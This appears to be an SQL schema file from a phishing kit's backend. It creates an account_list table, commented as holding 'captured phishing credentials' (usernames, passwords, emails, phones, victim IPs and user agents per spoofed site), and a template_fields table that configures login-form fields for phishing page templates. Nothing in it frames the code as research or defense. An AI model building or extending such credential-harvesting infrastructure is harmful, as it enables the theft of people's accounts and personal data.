-- Create account_list table for storing captured phishing credentials
CREATE TABLE IF NOT EXISTS account_list (
    id INT AUTO_INCREMENT PRIMARY KEY,
    website_id INT NOT NULL,
    website_slug VARCHAR(255) NOT NULL,
    username VARCHAR(255),
    password VARCHAR(500),
    email VARCHAR(255),
    phone VARCHAR(50),
    additional_fields JSON,
    ip_address VARCHAR(45),
    user_agent TEXT,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_website_id (website_id),
    INDEX idx_website_slug (website_slug),
    INDEX idx_captured_at (captured_at)
);

-- Create template_fields table for managing custom fields per template
CREATE TABLE IF NOT EXISTS template_fields (
    id INT AUTO_INCREMENT PRIMARY KEY,
    template_id INT NOT NULL,
    field_name VARCHAR(100) NOT NULL,
    field_type ENUM('text', 'password', 'email', 'tel', 'number', 'url') DEFAULT 'text',
    field_label VARCHAR(255),
    field_placeholder VARCHAR(255),
    max_length INT DEFAULT 255,
    is_required BOOLEAN DEFAULT FALSE,
    field_order INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    FOREIGN KEY (template_id) REFERENCES templates(id) ON DELETE CASCADE,
    UNIQUE KEY unique_template_field (template_id, field_name),
    INDEX idx_template_id (template_id)
);
